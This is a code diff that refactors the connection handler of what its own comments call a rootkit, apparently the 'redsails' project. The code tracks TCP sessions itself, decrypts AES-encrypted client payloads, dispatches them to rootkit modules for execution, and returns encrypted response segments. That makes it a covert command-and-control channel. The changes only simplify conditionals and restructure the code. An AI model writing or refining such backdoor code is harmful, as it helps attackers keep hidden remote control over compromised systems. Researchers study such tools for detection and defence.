@@ -17,7 +17,7 @@ class ConnectionsHandler:
 
 		# Create debug logging object
 		#self.loggingCH = loggingUtils("redsails-main-debug.log")
-		
+
 		# Holds the TCP connection records
 		self.connectionRecords = []
 
@@ -42,10 +42,10 @@ class ConnectionsHandler:
 
 			# True if the packet received is an initial SYN packet
 			if TCPHelper().isInitConnection(self.packet):
-				
+
 				# DEBUG - Log packet to debug log
 				#self.loggingCH.logPacket(self.packet, "INBOUND - Init connection")
-				
+
 				# Create and store initial TCP record
 				self.initTCPRecord()
 
@@ -55,30 +55,52 @@ class ConnectionsHandler:
 				# DEBUG - Log packet to debug log
 				#self.loggingCH.logPacket(self.packet, "OUTBOUND - Init response")
 
-			# [i] All other packets flow through here; the following should be true...
-			#	1) Maps to a valid TCP connection record
-			#	2) ACK packet finalizing a valid connection || Packet is apart of a valid connection
-			else:
-				# True if a connection record is found
-				if self.getConnectionRecord():
+			elif self.getConnectionRecord():
 					# True if packet is final ACK response to establish the TCP connection
-					if self.isFinalConnectionPacket():
-						# Sets TCP record to Connected=True and updates SEQ/ACK and Flags
-						self.updateRecordToConnected()
+				if self.isFinalConnectionPacket():
+					# Sets TCP record to Connected=True and updates SEQ/ACK and Flags
+					self.updateRecordToConnected()
+
+					# DEBUG - Log packet to debug log
+					#self.loggingCH.logPacket(self.packet, "ESTABLISHING - Final ACK")
+
+				elif self.currentRecord["Connected"] == True:
+					# DEBUG - Log packet to debug log
+					#self.loggingCH.logPacket(self.packet, "CONNECTED")
+
+					# At this point the packet is from a connected host
+					# Check if host is terminating the connectioin
+					self.isDisconnecting()
+					if self.isDisconnectingSession:
+						self.updateConnectionRecord()
+						self.sendResponsePacket()
+						self.sendResetPacketToConnected()
+						self.connectionRecords.pop(self.index)
 
 						# DEBUG - Log packet to debug log
-						#self.loggingCH.logPacket(self.packet, "ESTABLISHING - Final ACK")
+						#self.loggingCH.logPacket(self.packet, "DISCONNECTED")
 
-					# True if the packet is part of an already established connection
-					elif self.currentRecord["Connected"] == True:
-						# DEBUG - Log packet to debug log
-						#self.loggingCH.logPacket(self.packet, "CONNECTED")
+					# Packet is from connected host
+					# Process packet payload for modules calls and commands
+					else:
+						self.updateConnectionRecord()
+						# Decrypt packet payload from client for processing
+						try:
+							decPacketPayload = self.AESCrypto.decrypt(self.packet.tcp.payload)								
+							self.packet.tcp.payload = decPacketPayload
 
-						# At this point the packet is from a connected host
-						# Check if host is terminating the connectioin
-						self.isDisconnecting()
-						if self.isDisconnectingSession:
-							self.updateConnectionRecord()
+						except Exception as e:
+							pass
+
+						# [i] Packet processing for rootkit modules starts here
+						# 	1) Validate packet TCP flags (PSH|ACK)
+						#	2) Analyze packet payload for valid module symantics
+						#	3) Execute module if exists
+						#	4) Send encrypted response
+						self.moduleResponse = ModuleParsing(self.packet)
+						#self.updateConnectionRecord()
+
+						if self.moduleResponse.response == "xxxEXITxxx":
 							self.sendResponsePacket()
 							self.sendResetPacketToConnected()
 							self.connectionRecords.pop(self.index)
@@ -86,84 +108,39 @@ class ConnectionsHandler:
 							# DEBUG - Log packet to debug log
 							#self.loggingCH.logPacket(self.packet, "DISCONNECTED")
 
-						# Packet is from connected host
-						# Process packet payload for modules calls and commands
-						else:
-							self.updateConnectionRecord()
-							# Decrypt packet payload from client for processing
-							try:
-								decPacketPayload = self.AESCrypto.decrypt(self.packet.tcp.payload)								
-								self.packet.tcp.payload = decPacketPayload
-
-							except Exception as e:
-								pass
-							
-							# [i] Packet processing for rootkit modules starts here
-							# 	1) Validate packet TCP flags (PSH|ACK)
-							#	2) Analyze packet payload for valid module symantics
-							#	3) Execute module if exists
-							#	4) Send encrypted response
-							self.moduleResponse = ModuleParsing(self.packet)
-							#self.updateConnectionRecord()
-							
-							if self.moduleResponse.response == "xxxEXITxxx":
-								self.sendResponsePacket()
-								self.sendResetPacketToConnected()
-								self.connectionRecords.pop(self.index)
+						elif len(self.resp_list) > 0 or self.packet.tcp.payload == "SEG::MORE":
+							if len(self.resp_list) > 0:
+								self.sendNextResponseSegment()
 
 								# DEBUG - Log packet to debug log
-								#self.loggingCH.logPacket(self.packet, "DISCONNECTED")
-							
-							elif len(self.resp_list) > 0 or self.packet.tcp.payload == "SEG::MORE":
-								if len(self.resp_list) > 0:
-									self.sendNextResponseSegment()
+								#self.loggingCH.logPacket(self.packet, "CONNECTED - RSP SGMNT")
 
-									# DEBUG - Log packet to debug log
-									#self.loggingCH.logPacket(self.packet, "CONNECTED - RSP SGMNT")
-
-								# Signal client to know module response has finished
-								else:
-									self.resp_list.append(self.AESCrypto.encrypt("SEG::END"))
-									self.sendNextResponseSegment()
-									self.resp_list = []
-
+							# Signal client to know module response has finished
 							else:
-								self.sendResponsePacket()
+								self.resp_list.append(self.AESCrypto.encrypt("SEG::END"))
+								self.sendNextResponseSegment()
+								self.resp_list = []
 
-								# DEBUG - Log packet to debug log
-								#self.loggingCH.logPacket(self.packet, "CONNECTED")
+						else:
+							self.sendResponsePacket()
 
-					# Should not end up here...
-					else:
-						# DEBUG - Log packet to debug log
-						#self.loggingCH.logPacket(self.packet, "ROGUE - w/ Connection Record")
-						pass
-
-				# [i] True if the incoming packet...
-				#	1) is not an initial connection packet (SYN packet)
-				#	2) is not finalizing a connection handshake (ACK packet w/ matching SEQ/ACK)
-				#	3) is not a part of an already established connection, unless
-				#		it is a RST or FIN|ACK trying to close connection
-				else:
-					# DEBUG - Log packet to debug log
-					#self.loggingCH.logPacket(self.packet, "ROGUE")
-					# Send an RST to the host after testing we are not leaking valid packets here
-					pass
+							# DEBUG - Log packet to debug log
+							#self.loggingCH.logPacket(self.packet, "CONNECTED")
 
 	def initTCPRecord(self):
 		# Sets 'self.flags' from current packet flag settings
 		self.getFlags()
 
-		self.record = {}
-		self.record["SrcIP"] = self.packet.src_addr
-		self.record["SrcPort"] = self.packet.src_port
-		self.record["DstIP"] = self.packet.dst_addr
-		self.record["DstPort"] = self.packet.dst_port
-
-		self.record["ClntSEQ"] = self.packet.tcp.seq_num
-		self.record["ClntACK"] = self.packet.tcp.ack_num
-		self.record["ClntLEN"] = len(self.packet.tcp.payload)
-		self.record["ClntFLAGS"] = self.flags
+		self.record = {
+			"SrcIP": self.packet.src_addr,
+			"SrcPort": self.packet.src_port,
+			"DstIP": self.packet.dst_addr,
+			"DstPort": self.packet.dst_port,
+			"ClntSEQ": self.packet.tcp.seq_num,
+			"ClntACK": self.packet.tcp.ack_num,
+			"ClntLEN": len(self.packet.tcp.payload),
+			"ClntFLAGS": self.flags,
+		}
 
 		self.record["SrvSEQ"] = randint(0,4294967291)
 		self.record["SrvACK"] = self.packet.tcp.seq_num + 1
@@ -190,31 +167,11 @@ class ConnectionsHandler:
 		self.packet.tcp.payload = ""
 
 		flags = self.record["SrvFLAGS"]
-		if flags[0]:
-			self.packet.tcp.syn = 1
-		else:
-			self.packet.tcp.syn = 0
-
-		if flags[1]:
-			self.packet.tcp.ack = 1
-		else:
-			self.packet.tcp.ack = 0
-
-		if flags[2]:
-			self.packet.tcp.psh = 1
-		else:
-			self.packet.tcp.psh = 0
-
-		if flags[3]:
-			self.packet.tcp.fin = 1
-		else:
-			self.packet.tcp.fin = 0
-
-		if flags[4]:
-			self.packet.tcp.rst = 1
-		else:
-			self.packet.tcp.rst = 0
-
+		self.packet.tcp.syn = 1 if flags[0] else 0
+		self.packet.tcp.ack = 1 if flags[1] else 0
+		self.packet.tcp.psh = 1 if flags[2] else 0
+		self.packet.tcp.fin = 1 if flags[3] else 0
+		self.packet.tcp.rst = 1 if flags[4] else 0
 		self.packet.direction = 0
 
 		self.listenerCH.packet = self.packet
@@ -275,40 +232,25 @@ class ConnectionsHandler:
 		return False
 
 	def isFinalConnectionPacket(self):
-		only_ACK = False
-		null_payload = False
-		match_ACK2SEQ = False
-		connected = False
-
 		self.getFlags()
 
-		if (self.flags[1] == 1) and ((self.flags[0]+self.flags[2]+self.flags[3]+self.flags[4]) == 0):
-			only_ACK = True
+		only_ACK = (
+			self.flags[1] == 1
+			and (self.flags[0] + self.flags[2] + self.flags[3] + self.flags[4]) == 0
+		)
 
-		if (len(self.packet.tcp.payload) == 0):
-			null_payload = True
-
-		if (self.packet.tcp.seq_num == self.currentRecord["SrvACK"]):
-			match_ACK2SEQ = True
-
-		if (self.currentRecord["Connected"] == False):
-			connected = False
-
-		if (only_ACK and null_payload and match_ACK2SEQ and not connected):
-			return True
-
-		else:
-			return False
+		null_payload = len(self.packet.tcp.payload) == 0
+		match_ACK2SEQ = self.packet.tcp.seq_num == self.currentRecord["SrvACK"]
+		connected = False
+		return only_ACK and null_payload and match_ACK2SEQ and not connected
 
 	def isDisconnecting(self):
 		self.getFlags()
 
 		# Check of RST or FIN|ACK packet
-		if ((self.flags[4]==1) or (self.flags[3]==1 and self.flags[1]==1)):
-			self.isDisconnectingSession = True
-
-		else:
-			self.isDisconnectingSession = False
+		self.isDisconnectingSession = self.flags[4] == 1 or (
+			self.flags[3] == 1 and self.flags[1] == 1
+		)
 
 	def updateRecordToConnected(self):
 		self.getFlags()
@@ -394,7 +336,7 @@ class ConnectionsHandler:
 		self.packet.tcp.rst = 0
 
 		self.packet.tcp.payload = ""
-		
+
 		self.packet.tcp.payload = self.resp_list[0]
 		self.resp_list.pop(0)
 
